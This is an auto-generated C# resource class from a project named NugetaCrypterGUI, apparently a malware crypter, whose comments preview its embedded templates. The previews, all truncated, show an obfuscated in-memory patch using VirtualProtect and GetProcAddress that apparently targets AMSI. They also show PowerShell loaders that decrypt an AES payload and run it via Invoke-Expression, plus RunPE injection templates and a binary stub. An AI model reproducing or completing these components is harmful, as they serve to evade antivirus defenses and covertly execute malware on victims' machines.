//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.42000
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace NugetaCrypterGUI {
    using System;
    
    
    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "17.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Files {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Files() {
        }
        
        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("NugetaCrypterGUI.Files", typeof(Files).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System.Runtime.InteropServices;
        ///using System;
        ///using System.Text;
        ///using System.Diagnostics;
        ///
        ///namespace __Patch
        ///{
        ///    public class __Patcher
        ///    {
        ///        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        ///        public delegate IntPtr GetProcAddress(IntPtr UrethralgiaOrc, string HypostomousBuried);
        ///
        ///        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        ///        public delegate bool VirtualProtect(IntPtr GhostwritingNard, UIntPtr NontabularlyBankshall, uint YohimbinizationUninscr [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string Patch {
            get {
                return ResourceManager.GetString("Patch", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to $roflr = @&quot;
        ///using System;
        ///using System.Runtime.InteropServices;
        ///public class roflr {
        ///    [DllImport(&quot;kernel32&quot;)]
        ///    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        ///    [DllImport(&quot;kernel32&quot;)]
        ///    public static extern IntPtr LoadLibrary(string name);
        ///    [DllImport(&quot;kernel32&quot;)]
        ///    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ccrvcj, uint flNewProtect, out uint lpflOldProtect);
        ///}
        ///&quot;@
        ///
        ///Add-Type $roflr
        ///
        ///$smoibhc = [roflr]::LoadLibrary(&quot;$((&apos;ämsì. [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string PowershellPatch {
            get {
                return ResourceManager.GetString("PowershellPatch", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to $encryptedBytes = [System.Convert]::FromBase64String(&quot;%CIPHER%&quot;)
        ///$keyBase64 = &quot;%THEKEY%&quot;
        ///$ivBase64 = &quot;%THEIV%&quot;
        ///function DecryptAndRunPowerShellCode {
        ///    param (
        ///        [byte[]]$encryptedBytes,
        ///        [byte[]]$key,
        ///        [byte[]]$iv
        ///    )
        ///
        ///    try {
        ///        $plainText = DecryptBytesToString $encryptedBytes $key $iv
        ///
        ///        # Execute the decrypted PowerShell code
        ///        Invoke-Expression $plainText
        ///    } catch {
        ///        Write-Error &quot;Failed to decrypt and run PowerShell code: $($_.Except [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string PowershellPatchLoader {
            get {
                return ResourceManager.GetString("PowershellPatchLoader", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to $id = get-random
        ///$code = @&quot;
        ///using System.Reflection;
        ///using System.Threading;
        ///using System;
        ///using System.Runtime.InteropServices;
        ///using System.IO;
        ///using System.Diagnostics;
        ///using System.Security.Cryptography;
        ///namespace HelloWorld
        ///{
        ///    public class Program$id
        ///    {
        ///        // Implement required kernel32.dll functions 
        ///        [DllImport(&quot;kernel32&quot;)]
        ///        public static extern IntPtr LoadLibrary(string name);
        ///        [DllImport(&quot;kernel32&quot;)]
        ///        public static extern IntPtr GetProcAddress [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string PowershellRunPe {
            get {
                return ResourceManager.GetString("PowershellRunPe", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to $kmSoe=[System.Convert]::FromBase64String(&quot;%CIPHER%&quot;)
        ///$bAseK64=&quot;%THEKEY%&quot;
        ///$jBZe64=&quot;%THEIV%&quot;
        ///function XpbygNPqLrDzG {
        ///    param([byte[]]$kmSoe,[byte[]]$bAseK,[byte[]]$jBZe)
        ///    try {
        ///        $JmRTUe = DecryptBytesToString $kmSoe $bAseK $jBZe
        ///        if (validateAndSanitizePowerShellCode $JmRTUe) {
        ///            iex $JmRTUe
        ///        } else {
        ///            Write-Error &quot;Failed to validate and sanitize PowerShell code&quot;
        ///        }
        ///    } catch {
        ///        Write-Error &quot;Failed to decrypt and run PowerShell code [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string PowershellRunPeLoader {
            get {
                return ResourceManager.GetString("PowershellRunPeLoader", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System.Reflection;
        ///using System;
        ///using System.Runtime.InteropServices;
        ///namespace __ScriptExecution
        ///{
        ///    public class __Executor
        ///    {
        ///        // Implement required kernel32.dll functions 
        ///        [DllImport(&quot;kernel32&quot;)]
        ///        public static extern IntPtr LoadLibrary(string name);
        ///        [DllImport(&quot;kernel32&quot;)]
        ///        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        ///        [DllImport(&quot;kernel32&quot;)]
        ///        public static extern bool VirtualProtect(IntPtr lpAdd [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string RunPe {
            get {
                return ResourceManager.GetString("RunPe", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Byte[].
        /// </summary>
        internal static byte[] stub {
            get {
                object obj = ResourceManager.GetObject("stub", resourceCulture);
                return ((byte[])(obj));
            }
        }
    }
}
